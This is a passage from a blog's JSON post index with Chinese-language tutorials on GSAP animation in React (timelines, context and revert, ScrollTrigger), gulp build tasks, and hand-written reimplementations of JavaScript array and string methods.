className='wrapper'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default App gsap.timeline()gsap.timeline() 會回傳一個自動幫你處理「順序」的時間軸物件。 舉例來說如果想實作這樣的效果： 一個比較直覺的做法是透過 delay 來設定延遲時間，來實現「等 A 跑完後再跑 B」的效果，所以這邊 code 會長這樣： 123456789101112131415161718192021222324252627282930import { gsap } from 'gsap'function App() { function demo() { gsap.to('.square1', { x: 300, duration: 1, ease: 'none' }) gsap.to('.square2', { x: 300, duration: 1, delay: 1, // delay 1 秒後才執行 ease: 'none' }) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;div className='square square2'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default App 老實說這樣的做法沒什麼問題，唯一的缺點就是要計算每一個動畫的延遲時間還蠻麻煩的而已。 但如果用 gsap.timeline 來改寫的話會輕鬆許多： 1234567891011121314151617181920212223242526272829303132333435import { gsap } from 'gsap'function App() { function demo() { // new 一個時間軸的 instance（只是一種修飾法，不是真的 new） const timeline = gsap.timeline() timeline // 第一段動畫 .to('.square1', { duration: 1, x: 300, ease: 'none' }) // 第二段動畫 .to('.square2', { duration: 1, x: 300, ease: 'none' }) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;div className='square square2'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default App 出來的結果是一模一樣的： 用時間軸的好處很明顯，就是你只要把按照順序去 call 對應的 function 就好，timeline 會自動幫我們搞定好延遲的問題。 位置參數（position parameter）想要更精確的控制時間軸的話，可以加上第三個參數來做控制。詳細的部分可以參考 官方文件 1. 在時間軸的起始位置插入秒數（也可以想成時延遲秒數的意思） 123456789101112131415161718192021222324252627282930import { gsap } from 'gsap'function App() { function demo() { const timeline = gsap.timeline() timeline.to( '.square1', { duration: 1, x: 300, ease: 'none' }, 2 // 插入 2 秒 ) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default Appjk 2. 插入到前一個時間軸的起始點，換句話說就是「跟上一個時間軸同步」 1234567891011121314151617181920212223242526272829303132333435import { gsap } from 'gsap'function App() { function demo() { const timeline = gsap.timeline() timeline.to('.square1', { duration: 1, x: 300, ease: 'none' }), timeline.to( '.square2', { duration: 1, x: 300, ease: 'none' }, '&lt;' // 插入到前一個時間軸的起始點 ) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;div className='square square2'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default App 3. 插入到前一個時間軸的終點，其實就跟預設值一樣，會「依照順序」來執行。 1234567891011121314151617181920212223242526272829303132333435import { gsap } from 'gsap'function App() { function demo() { const timeline = gsap.timeline() timeline.to('.square1', { duration: 1, x: 300, ease: 'none' }), timeline.to( '.square2', { duration: 1, x: 300, ease: 'none' }, '&gt;' // 插入到前一個時間軸的終點 ) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;div className='square square2'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default App","link":"/2022/11/12/gsap-basic-methods/"},{"title":"Gsap－context 與 revert（寫 React 的必備知識）","text":"學任何東西的第一步：從踩地雷開始。 簡述如果要用 React 18 來使用 Gsap 的話 ，一定要先認識 context 與 revert 的用途，不然你可能會像我一樣踩到很多雷 QQ 首先 React 18 的 &lt;React.StrictMode&gt; 有個很常見的問題，就是 useEffect 會 render 兩次，例如說： 123useEffect(() =&gt; { console.log('effect')}, []) 執行後你會看到 effect 被 log 兩次，這個是 React 18 以後都會出現的預期行為。可是這樣子會引發的問題是「每一次在 useEffect 中設置的動畫其實會被執行兩次」，接著就會產生一些靈異現象，舉幾個我蠻常碰到的： 每次 hot reload 的時後動畫都會變得怪怪的 在使用 scroll 類的 plugin 時會直接跑版 etc… 而解決這個問題的方法就是在 clean functoin 中做一些處理。打個比方來說，如果你在 useEffect 中設置了像 setInterval 這類的計時器，那你應該會想到要在 clean function 中用 clearInterval 把這個計數器給清掉，免得在一開始的時候設定到兩次計時器，對吧？ 所以接下來會介紹如何用 revert 解決執行兩次的問題。 revert其實動畫也是一樣的，既然它會被 call 兩次，那我就要在它被 call 第二次以前把第一次的動畫給清除掉，所以會這樣子寫： 12345678910111213useEffect(() =&gt; { const tween = gsap.to('.square', { background: '#28a92b', duration: 2, rotation: 360, xPercent: '100', ease: 'none', repeat: -1, yoyo: true }) return () =&gt; tween.revert()}, []) revert 的作用是把動畫取消並清除所有 gsap 加上去的 inline style，這跟另一個叫做 kill 的 method 有點類似，但還是有差異，就是 kill 並不會把 inline-style 給清除，不懂的話可以到 這個範例 參考看看。 context接著來介紹 context 的用途，不過在那之前先回憶一下剛剛的範例： 12345678910111213useEffect(() =&gt; { const tween = gsap.to('.square', { background: '#28a92b', duration: 2, rotation: 360, xPercent: '100', ease: 'none', repeat: -1, yoyo: true }) return () =&gt; tween.revert()}, []) 我們在前面提過在 useEffect 中執行動畫時，要記得在 clean function 中用 revert 來避免動畫被執行兩次的問題。可是另一個問題來了： 我的動畫很多耶，難道也得一個一個 revert 哦？ 1234567891011121314151617useEffect(() =&gt; { const tween1 = gsap.to('.square1', {...}) const tween2 = gsap.to('.square2', {...}) const tween3 = gsap.to('.square3', {...}) const tween4 = gsap.to('.square4', {...}) const tween5 = gsap.to('.square5', {...}) const tween6 = gsap.to('.square6', {...}) return () =&gt; { tween1.revert() tween2.revert() tween3.revert() tween4.revert() tween5.revert() tween6.revert() }}, []) 如果不使用 context 的話確實只能這樣子做，但是用了 context 以後可以輕輕鬆鬆用一行來搞定： 1234567891011121314useEffect(() =&gt; { // 把所有動畫都包在 context 裡 const ctx = gsap.context(() =&gt; { const tween1 = gsap.to('.square1', {...}) const tween2 = gsap.to('.square2', {...}) const tween3 = gsap.to('.square3', {...}) const tween4 = gsap.to('.square4', {...}) const tween5 = gsap.to('.square5', {...}) const tween6 = gsap.to('.square6', {...}) }) // 一鍵重置 return () =&gt; ctx.revert()}, []) 之所以可以這麼輕鬆是因為 context 的本質是用來「記錄 tween 或 timeline」，只要是出現在 context 裡面的動畫都會被記錄下來，所以當你對整個 context 執行 revert 時，就好像是在說「幫我把所有記錄給重置」的感覺，所以所有記錄都會被重置。 使用 context 的好處還有很多，但我覺得這種 revert 的功能可以算是寫 React 的起手式了，所以這個功能一定要學起來，接下來會介紹幾個 context 的其他功能。 在 context 中設定 scope既然我們都寫 React 了，那就一定會把一些東西抽出去寫成「元件」，來達到重複使用的便利性。可是這時候會碰到的另一個問題是，如果「不同的元件中有相同的 class 名稱怎麼辦？」，舉個例子： 12345678910111213141516171819202122232425function App() { return ( &lt;&gt; &lt;div className='App'&gt; &lt;div className='square'&gt;square1&lt;/div&gt; &lt;B /&gt; &lt;/div&gt; &lt;/&gt; )}function B() { useEffect(() =&gt; { const ctx = gsap.context(() =&gt; { gsap.to('.square', { xPercent: '-50', duration: 2 }) }) return () =&gt; ctx.revert() }, []) return ( &lt;div&gt; &lt;div className='square'&gt;square2&lt;/div&gt; &lt;/div&gt; )} App 裡面有一個子元件 B，而 B 裡面對 .square 設置了一個動畫，那結果會怎麼樣？ 這時候你就會發現「不對啊，我只想對 B 裡面的 .square 設動畫而已，怎麼也動到 A 的 .square 了」。不過仔細想想這也挺合理的，畢竟都叫做 .square 嘛，誰知道你指的是哪一個 .square 呢？ 總而言之，為了避免這種問題我們可以在 context 中傳入一個值來限制 scope，例如把剛剛的範例改寫成這樣： 123456789101112131415161718192021222324252627function App() { return ( &lt;&gt; &lt;div className='App'&gt; &lt;div className='square'&gt;square1&lt;/div&gt; &lt;B /&gt; &lt;/div&gt; &lt;/&gt; )}function B() { const component = useRef &lt; HTMLDivElement &gt; null useEffect(() =&gt; { const ctx = gsap.context(() =&gt; { gsap.to('.square', { xPercent: '-50', duration: 2 }) // 把 scope 限制在 B 的 &lt;div&gt; 中 }, component) return () =&gt; ctx.revert() }, []) return ( &lt;div ref={component}&gt; &lt;div className='square'&gt;square2&lt;/div&gt; &lt;/div&gt; )} 加上 scope 以後，就代表只有出現在 B 裡面的 .square 才會被設置動畫： 在 context 中使用事件有些時候你可能會想要在點擊的時候才觸發動畫，這時候你可以這樣做： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function App() { const component = useRef(null) const btn = useRef &lt; HTMLButtonElement &gt; null const square = useRef &lt; HTMLDivElement &gt; null useEffect(() =&gt; { const ctx = gsap.context((context) =&gt; { // 新增一個 custom event（名字自己取） context.add('onSquareClick', () =&gt; { gsap.to('.square', { background: '#28a92b', duration: 2, rotation: 360, xPercent: '100', ease: 'none', repeat: -1, yoyo: true }) }) }, component) // 設置監聽器 square.current?.addEventListener('click', onTriggerAnimate) btn.current?.addEventListener('click', onRevert) return () =&gt; { ctx.revert() // 移除監聽器（重要!!!，請務必記得移除，不然會有問題） square.current?.removeEventListener('click', onTriggerAnimate) btn.current?.removeEventListener('click', onRevert) } function onTriggerAnimate() { // 透過 ctx 呼叫 custom event ctx.onSquareClick() } function onRevert() { ctx.revert() } }, []) return ( &lt;&gt; &lt;div ref={component} className='App'&gt; &lt;button className='btn' ref={btn}&gt; Kill the animate &lt;/button&gt; &lt;div className='square one' ref={square}&gt; One &lt;/div&gt; &lt;/div&gt; &lt;/&gt; )} 或者也可以寫成這樣子： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function App() { const component = useRef(null) const btn = useRef &lt; HTMLButtonElement &gt; null const square = useRef &lt; HTMLDivElement &gt; null useEffect(() =&gt; { // 裡面不放東西 const ctx = gsap.context(() =&gt; {}, component) // 透過 ctx 來新增 custom event ctx.add('onSquareClick', () =&gt; { gsap.to('.square', { background: '#28a92b', duration: 2, rotation: 360, xPercent: '100', ease: 'none', repeat: -1, yoyo: true }) }) // 設置監聽器 square.current?.addEventListener('click', onTriggerAnimate) btn.current?.addEventListener('click', onRevert) return () =&gt; { ctx.revert() // 移除監聽器（重要!!!，請務必記得移除，不然會有問題） square.current?.removeEventListener('click', onTriggerAnimate) btn.current?.removeEventListener('click', onRevert) } function onTriggerAnimate() { ctx.onSquareClick() } function onRevert() { ctx.revert() } }, []) return ( &lt;&gt; &lt;div ref={component} className='App'&gt; &lt;button className='btn' ref={btn}&gt; Kill the animate &lt;/button&gt; &lt;div className='square one' ref={square}&gt; One &lt;/div&gt; &lt;/div&gt; &lt;/&gt; )} 我懶的貼圖了，所以 範例一、範例二 就直接附在這了。 順便解釋一下為什麼要用這種方式來實作？你可能會想說「不能直接把 event 寫在 context 中來處理嗎」，像這樣： 1234567891011121314151617useEffect(() =&gt; { const ctx = gsap.context(() =&gt; { square.current?.addEventListener('click', () =&gt; { gsap.to('.square', { background: '#28a92b', duration: 2, rotation: 360, xPercent: '100', ease: 'none', repeat: -1, yoyo: true }) }) }, component) btn.current?.addEventListener('click', () =&gt; ctx.revert())}, []) 這個就要回憶一下「同步 / 非同步」的觀念了，不過簡單來說 ctx 從執行到結束時，gsap.to 裡面的內容其實是不會被記錄下來的，因為那個當下根本還沒被點擊，而沒被點擊就代表還沒觸發動畫。 所以接下來當你想透過 ctx.revert() 來重置時，就會因為找不到該筆紀錄所以沒辦法正確的重置，這就是為什麼不能這樣寫的原因。","link":"/2022/11/10/gsap-react-basic/"},{"title":"Gsap－ScrollTrigger","text":"寫視差的必背工具。 基本觀念當我們希望動畫是藉由「滾動」來觸發時，就會用到 ScrollTrigger 這個 Plugin，來看一個簡單的範例： 這個範例做的事情是當我們把滾軸捲到距離 viewport 30px 的位置時就會觸發動畫，原始碼如下： 1234567891011121314151617181920212223242526272829import { gsap } from 'gsap'import ScrollTrigger from 'gsap/ScrollTrigger'import { useEffect } from 'react'function App() { useEffect(() =&gt; { // 要先註冊 plugin，這樣我們才能用這個功能 gsap.registerPlugin(ScrollTrigger) gsap.to('.square', { rotationZ: 180, duration: 1, ease: 'none', scrollTrigger: { trigger: '.square', // 用來 trigger 這個動畫的元素 start: 100 // 距離 viewport 位置 100px 時觸發動畫 } }) }, []) return ( &lt;&gt; &lt;div className='section'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;/&gt; )}export default App 這邊想特別講的是 start 值的設定方式，除了像上面那樣直接指定距離 viewport 多少 px 時觸發以外，也可以用「字串」的方式來指定，例如這樣子： 1234567891011121314151617181920212223242526272829import { gsap } from 'gsap'import ScrollTrigger from 'gsap/ScrollTrigger'import { useEffect } from 'react'function App() { useEffect(() =&gt; { gsap.registerPlugin(ScrollTrigger) gsap.to('.square', { rotationZ: 180, duration: 1, ease: 'none', scrollTrigger: { trigger: '.square', // 用來 trigger 這個動畫的元素 start: 'bottom 250px', // 當 .square 的底端碰到 viewport 位置 250px 時觸發動畫 markers: true } }) }, []) return ( &lt;&gt; &lt;div className='section'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;/&gt; )}export default App 總之一定要記得： 第一個值是相對於 trigger 的那個元素，第二個值是相對於 viewport 第一個值是相對於 trigger 的那個元素，第二個值是相對於 viewport 第一個值是相對於 trigger 的那個元素，第二個值是相對於 viewport 所以如果我設定 start: 'bottom 100px' 的話，意思就是： 當 .square 的底端（bottom）碰到 viewport 100px 的位置時觸發動畫。 Toggle Actions簡單來說這個功能是讓你可以決定當元素進入 or 離開滾軸範圍時妳想做什麼樣的動作（Action） 直接來看個例子： 這個動畫其實很簡單，就是當滾軸進入範圍時把方塊用旋轉到中間的位置，不過特別的地方在於我們多加了一些 actions，讓他可以在進入、離開滾軸範圍時做不同的操作： 當 start 碰到 scroller-start 時重新播放動畫（進入） 當 end 碰到 scroller-end 時暫停動畫（離開） 當 end 又碰到 scroler-end 時繼續播放動畫（重新進入） 當 start 又碰到 scroller-start 時倒放動畫（重新離開） 這邊的 原始碼 如下，我覺得看註解搭配圖片大概就能懂意思了： 123456789101112131415161718192021222324252627282930313233343536import { gsap } from 'gsap'import ScrollTrigger from 'gsap/ScrollTrigger'import { useEffect } from 'react'function App() { useEffect(() =&gt; { gsap.registerPlugin(ScrollTrigger) gsap.to('.square', { rotationZ: 180, duration: 1, position: 'absolute', left: '50%', xPercent: '-50', scrollTrigger: { trigger: '.square', start: 'top 200px', end: 'center 100px', markers: true, // 用這個屬性來控制 action // 可以設定的值：play resume reverse restart reset complete none toggleActions: 'restart pause resume reverse' // 每個值會對應到：onEnter onLeave onEnterBack onLeaveBack } }) }, []) return ( &lt;&gt; &lt;div className='section'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;/&gt; )}export default App Scrub當你希望把動畫的時間軸完全交給「滾軸」來控制時就會用到這個功能。 首先跟剛剛一樣要註冊一個時間軸，不同的是現在要多填入一些參數，讓 gsap 知道這個時間軸是可以被滾軸控制的： 123456789101112131415161718192021222324252627282930import { gsap } from 'gsap'import ScrollTrigger from 'gsap/ScrollTrigger'import { useEffect } from 'react'function App() { useEffect(() =&gt; { // 記得先對 gsap 註冊額外的 module gsap.registerPlugin(ScrollTrigger) // 建立 timeline 並帶入參數 const timeline = gsap.timeline({ scrollTrigger: { trigger: '.wrapper', // 觸發 scrollTrigger 的那個元素 markers: true, // 讓 gsap 自動幫你畫出 start / end 標記點 start: 'top 200px', // 動畫開始的位置 end: 'top 10px', // 動畫結束的位置 scrub: true // 決定動畫播放是否由滾軸來控制（重要！！！） } }) }, []) return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; )}export default App 設定好以後應該會看到這樣的畫面： 簡單來說這邊的意思是當 start 碰到 scroller-start 的時候就會播放動畫，而 end 碰到 scroller-end 時動畫就會結束。而且因為我們有設定 scrub: true，所以動畫會隨著滾軸來控制播放的時間軸。 所以我們可以試著加上一點動畫，像這樣： 12345678910111213141516171819202122232425262728293031323334353637383940import { gsap } from 'gsap'import ScrollTrigger from 'gsap/ScrollTrigger'import TextPlugin from 'gsap/TextPlugin'import { useEffect } from 'react'function App() { useEffect(() =&gt; { gsap.registerPlugin(ScrollTrigger, TextPlugin) demo() }, []) function demo() { const timeline = gsap.timeline({ scrollTrigger: { trigger: '.wrapper', markers: true, start: 'top 200px', end: 'top 10px', scrub: true } }) // 加上動畫（移動到中間的位置） timeline.to('.square1', { position: 'absolute', // 記得 .wrapper 要設置為 relative top: '0', left: '50%', xPercent: '-50' }) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; )}export default App 附註：注意 start 碰到 scroller-start 時動畫才開始播放，而 end 碰到 scroller-end 時動畫會剛好結束播放。 看到這邊以後，應該就不難理解這是怎麼運作的了，所以接著只要再把動畫的部分給完成就行了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import { gsap } from 'gsap'import ScrollTrigger from 'gsap/ScrollTrigger'import TextPlugin from 'gsap/TextPlugin'import { useEffect } from 'react'function App() { useEffect(() =&gt; { gsap.registerPlugin(ScrollTrigger, TextPlugin) demo() }, []) function demo() { const timeline = gsap.timeline({ scrollTrigger: { trigger: '.wrapper', markers: true, start: 'top 200px', end: 'top 10px', scrub: true } }) timeline // 移動到中間的動畫 .to('.square1', { position: 'absolute', top: '0', left: '50%', xPercent: '-50' }) // 移動到下面的動畫 .to('.square1', { position: 'absolute', top: '100%', left: '50%', xPercent: '-50', yPercent: '-100' }) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; )}export default App 最後就達成一開始想要的結果了： Pin當初在學這個屬性時我自己覺得實在沒有很好理解，所以先來看一個範例吧。 這是沒 pin 的時候： 這是有 pin 的時候： 附註：原始碼可以到這個 範例 參考。 簡單來說，只要設了 pin: true 以後，藍色方塊就會在 start 碰到 scroller-start 時，把自己「釘（pin）」在 scroller-start 的位置。接著等到 end 碰到 scroller-end 時，藍色方塊才會取消釘選。（有點饒口，建議多閱讀幾次） pinSpacing接著再來看另外一個例子，跟剛剛不同的是現在多了一個方塊： 這個範例是拿橘色方塊來當作 scrollTrigger，觸發時會把藍色方塊給 pin 住住，直到 end 碰到 scroller-end 為止。 這段主要的原始碼大概長這樣： 123456789101112useEffect(() =&gt; { const tl = gsap.timeline({ scrollTrigger: { trigger: '.square2', // 橘色方塊 start: 'top 80%', end: 'top 50%', markers: true, pin: '.square', // 藍色方塊 pinSpacing: false // 下面會解釋這個的用途 } })}, []) 不過為什麼要特別講這個呢？首先看了上面的原始碼後應該會注意到 pinSpacing 這個屬性，他的用途是「自動把要被 pin 住的元素跟後面的元素加上一段距離」。我知道這樣子講很難理解，所以直接來看範例吧。 現在把 pinSpacing 設為 true： 注意到藍色方塊跟橘色方塊一開始就產生了一段「距離」，這段距離就是透過 pinSpacing 來產生的。而且這個距離會算的剛剛好，當藍色方塊結束 pin 時會正好停在它原本跟橘色方塊應該相隔的距離，假設它們原本有 10px 的間隔，那藍色方塊結束 pin 時就會停在橘色方塊上方 10px 的距離。 如果有點難理解的話我直接示範給你看（現在把方塊加上 margin）： 如果還是不懂的話，自己到 範例 去玩玩看吧。 實作簡易的視差效果在知道 pin 跟 pinSpacing 的原理後，就可以做出這樣的效果： 我的思路是這樣： 建立一個 section（100vh 滿版高） 在 section 中放置左右各 50% 的區塊，並透過 absolute 定位在 section 的左邊與右邊 步驟二的左右 50% 區塊要透過 z-index 來疊三層，調整圖層順序 透過 scrollTrigger 來設置動畫，trigger 為 section。觸發點為 section 最上方，結束點為 section 最下方，而 scroller-start / scroller-end 皆為 viewport 的最上方（0%） 建立 timeline，第一段要把左邊向上位移 100%，右邊向下位移 100%，第二段也以此類推。 這個範例我剛開始實作的時候有碰到一個不太懂的地方，就是為什麼section 明明只有設置 100vh 而已，整個網頁的高度卻是 200vh，並且產生滾軸？ 其實是因為前面介紹的 pinSpacing，預設 true 時他會自動產生一段距離，讓你在這段 pin 結束時可以剛好跟下面的元素無縫接軌，也避免掉 pin 的期間會覆蓋到下面元素的問題。 而這裡 section 會 pin 住的範圍正好是 100vh，所以額外產生出來的範圍就會是 100vh，所以跟原本的高度加起來就會是 200vh。 這段比較複雜一點，建議實際到 範例 看一下原始碼跟試試看，應該就會比較清楚了。 實作簡易的進場效果 這個範例主要是練習對 ScrollTrigger 的應用，也順便介紹幾個新知識： ScrollTrigger.create 可以透過這種方式來設定滾軸觸發，不用一定要綁在 tween 或 timeline 上 gsap.utils.toArray('.selector') 其實就跟 querySelectorAll 差不多，差別在於它會自動幫你轉成 Array，而不是 NodeList。 至於思路的部分簡單說一下： 對每個方塊設置獨立的 ScrollTrigger，並且根據順序來決定從「左邊 / 右邊」來進場 對每個文字段落設置獨立的 ScrollTrigger，進入 scroller-start 時播放動畫（利用 fromTo） 游標只要不停閃爍即可，所以只需要設定閃爍動畫後就行了 最後老話一句，想理解細節的話可以參考原始碼。","link":"/2022/11/17/gsap-scroll-trigger/"},{"title":"gulp 的使用方法","text":"雖然逐漸沒落，但還是有不錯用的時機。 簡述先安裝 gulp 需要的套件： gulp-cli（可裝在全域） gulp 安裝完後執行 gulp --version 或 npx gulp --version 確認有版本資訊就 OK 了。 基本結構1234567function defaultTask(cb) { // 在這裡寫要執行的任務，可以是 plug-in 或自己捏 // 任務執行完後就呼叫 cb 告訴 gulp 任務結束 cb();}// exports.任務名稱 = 執行任務的 functionexports.default = defaultTask 在預設的設定下，執行 gulp 會自動去找 default 的任務名稱。所以上面就會從 default 裡面找到 defaultTask 並且執行。 當然，如果你要自行指定任務也可以這樣下： 12# 假設有 exports.yoyoyogulp yoyoyo 牛刀小試－串 babel用 gulp 的第一件事是找出你想執行的任務套件。 常見的任務通常都會有人家寫好的，真的找不到才需要自己寫 JS，所以有現成的就盡量拿來用就好。 接著參考 文件 的說明來做設定： 1234567891011121314151617181920// 把 gulp 讀檔跟輸出的 function 引入const { src, dest } = require('gulp');// 用來執行 babel 這個 task 的套件const babel = require('gulp-babel');// 定義這個任務要做的事情function ComplieJS() { /* 1. 用 src 把所有 .js 檔案讀入 2. 執行 babel 3. 輸出到 output 資料夾（destination） */ return src('src/*.js') // 已經有設定 babel.config.json 的話可以省略 .pipe(babel({ presets: ['@babel/env'] })) .pipe(dest('output/'));}exports.default = ComplieJS 接下來執行 gulp，成功的話就會拿到 babel 後的 JS。 當任務越來越多時舉例來說： 1234567891011121314151617181920212223242526272829303132333435363738const { src, dest, parallel, series } = require('gulp');const babel = require('gulp-babel');const uglify = require('gulp-uglify');const rename = require(\"gulp-rename\");const sass = require('gulp-sass')(require('sass'));const cleanCSS = require('gulp-clean-css');/* 1. 用 babel 編譯 JS 2. 壓縮 3. 重新命名後輸出 */function complieJS () { return src('src/*.js') .pipe(babel()) .pipe(dest('js/')) .pipe(uglify()) .pipe(rename('min.js')) .pipe(dest('js/'));}/* 1. 用 sass 編譯 scss 2. 壓縮 3. 重新命名後輸出 */function complieCSS () { return src('src/*.scss') .pipe(sass().on('error', sass.logError)) .pipe(dest('css/')) .pipe(cleanCSS()) .pipe(rename('min.css')) .pipe(dest('css/'));}// 同時進行exports.default = parallel(complieJS, complieCSS);// 一個一個進行exports.default = series(complieJS, complieCSS); 這邊只是想介紹 parallel series 的用法，如果任務之間沒有依賴性的話可以用 parallel（平行執行），執行上會比較快。","link":"/2022/02/28/gulp-usage/"},{"title":"實作陣列內建函式","text":"自己做做看。 Array.map12345678910111213141516171819202122232425262728293031323334353637383940function map(arr, handler) { // 新陣列 let newArr = [] // 遍歷陣列內容 for(let i=0; i&lt;arr.length; i++) { // 將回傳值寫入新陣列 // 傳入三個參數： // 1. 目前元素 // 2. 索引值 // 3. 來源陣列 newArr[i] = handler(arr[i], i, arr) } return newArr}const result = map([1, 2, 3], (elem, index, src) =&gt; { // 來源陣列 console.log('srcArray:', src) // 索引值 console.log('index:', index) // 目前元素 console.log('elem:', elem) // 元素處理後的回傳值 return elem * 2})console.log('return value:', result)// output: srcArray: [1, 2, 3]// output: index: 0// output: elem: 1// output: srcArray: [1, 2, 3]// output: index: 1// output: elem: 2// output: srcArray: [1, 2, 3]// output: index: 2// output: elem: 3// output: return value: [2, 4, 6] Array.lastIndexOf1234567891011121314function lastIndexOf(arr, target) { // 反向迴圈 for(let i=arr.length; i&gt;=0; i--) { // 符合 target 就回傳目前索引值 if(target === arr[i]) { return i } } // 沒有符合的 target 回傳 -1 return -1}console.log(lastIndexOf([1, 2, 2, 3], 2)) // 2 console.log(lastIndexOf([1, 2, 2, 3], 3)) // 3console.log(lastIndexOf([1, 2, 2, 3], 4)) // -1 Array.indexOf123456789101112131415function indexOf(arr, searchElement) { // 遍歷陣列元素 for(let i=0; i&lt;arr.length; i++) { // 找到目標 if(arr[i] === searchElement) { // 回傳索引值 return i } } // 找不到 return -1}console.log(indexOf([1, 2, 2, 3], 2)) // 1console.log(indexOf([1, 2, 2, 3], 3)) // 3console.log(indexOf([1, 2, 2, 3], 4)) // -1 Array.reverse解法 1 =&gt; 反向迴圈 + push： 1234567891011121314151617function reverse(arr) { let result = [] // 反向迴圈 for(let i=arr.length-1; i&gt;=0; i--) { result.push(arr[i]) } // 修改原陣列 for(let i=0; i&lt;arr.length; i++) { arr[i] = result[i] } // 回傳值 return result}const array1 = [1, 2, 3]const array2 = reverse(array1)console.log(array1) // [3, 2, 1] console.log(array2) // [3, 2, 1] 解法 2 =&gt; 迴圈 + 動態索引值： 12345678910111213141516171819202122function reverse(arr) { // 動態索引值 // i=0 =&gt; k=2 // i=1 =&gt; k=1 // i=2 =&gt; k=0 let k = arr.length - 1 let result = [] // 正向迴圈 for(let i=0; i&lt;arr.length; i++) { result[i] = arr[k-i] } // 修改原陣列 for(let i=0; i&lt;arr.length; i++) { arr[i] = result[i] } // 回傳值 return result}const array1 = [1, 2, 3]const array2 = reverse(array1)console.log(array1) // [3, 2, 1] console.log(array2) // [3, 2, 1] Array.fill123456789101112131415161718function fill(arr, value) { const result = [] // 遍歷陣列元素 for(let i=0; i&lt;arr.length; i++) { result[i] = value } // 修改原陣列 for(let i=0; i&lt;arr.length; i++) { // 把值填入新陣列 arr[i] = result[i] } // 回傳結果 return result}const array1 = [1, 2, 3]const array2 = fill(array1, 'A')console.log(array1) // ['A', 'A', 'A']console.log(array2) // ['A', 'A', 'A'] Array.join1234567891011121314151617function join(arr, separator) { let result = '' // 遍歷陣列元素 for(let i=0; i&lt;arr.length; i++) { // 不是最後一個元素才插值 if(i !== arr.length-1) { result += arr[i] + separator } else { // 最後一個元素直接填入 result += arr[i] } } // 回傳結果 return result}const str = join([1, 2, 3], ',')console.log(str) // '1,2,3' Array.filter123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function filter(arr, callback) { let result = [] let k = 0 for(let i=0; i&lt;arr.length; i++) { // 把回傳 true 的元素加入到結果陣列 // 傳入三個參數 // 1. 目前的元素 // 2. 索引值 // 3. 來源陣列 if(callback(arr[i], i, arr)) { result[k] = arr[i] // 更新索引值 k++ } } // 回傳結果陣列 return result}const newArray = filter([1, 2, 3, 4, 5], (elem, index, src) =&gt; { // 來源陣列 console.log('srcArray:', src) // 索引值 console.log('index:', index) // 目前元素 console.log('elem: ', elem) // 回傳判斷結果 return elem &gt; 2})console.log('newArray:', newArray) // output: srcArray: [1, 2, 3, 4, 5]// output: index: 0// output: elem: 1// output: srcArray: [1, 2, 3, 4, 5]// output: index: 1// output: elem: 2// output: srcArray: [1, 2, 3, 4, 5]// output: index: 2// output: elem: 3// output: srcArray: [1, 2, 3, 4, 5]// output: index: 3// output: elem: 4// output: srcArray: [1, 2, 3, 4, 5]// output: index: 4// output: elem: 5// output: newArray: [3, 4, 5] Array.slice12345678910111213141516var arr = [1, 2, 3, -1, -2]var myResult = mySlice(arr, 1)function mySlice(array, optionStart, optionEnd) { var result = [] var start = optionStart || 0 var end = optionEnd || array.length if (start &gt; array.length) start = 0 if (end &gt; array.length) end = array.length for(var i=start; i&lt;end; i++) { result.push(array[i]) } return result} Array.reduce123456789101112function reduce(arr, Afunction) { // 累加器 let accumulator = 0 for(let i=0; i&lt;arr.length; i++) { // 更新累加器的值 accumulator = Afunction(accumulator, arr[i]) } // 回傳累加結果 return accumulator}const result = reduce([1, 2, 3, 4 ,5],(acc, elem) =&gt; acc + elem)console.log(result) // 15","link":"/2021/12/20/handmade-built-in-function-array/"},{"title":"實作字串內建函式","text":"自己做做看。 String.repeat12345678function repeat(str, times) { var result = '' for(var i=0; i&lt;times; i++) { result += str } return result}console.log(repeat('a', 5)) // aaaaa String.trim解法 1 =&gt; 找出頭尾的索引值： 12345678910111213141516171819202122232425262728293031323334function trim(s) { // 結果字串 let result = '' // 儲存起點位置 let first = 0 // 儲存終點位置 // 要注意輸入為 ' ' 的 edge case let last = s.length - 1 // 找出從前面數來第一個非空白字元的索引值 for(let i=0; i&lt;s.length; i++) { if(s[i] !== ' ') { first = i break } } // 找出從後面數來第一個非空白字元的索引值 for(let i=s.length-1; i&gt;=0; i--) { if(s[i] !== ' ') { last = i break } } // 組合字串 // 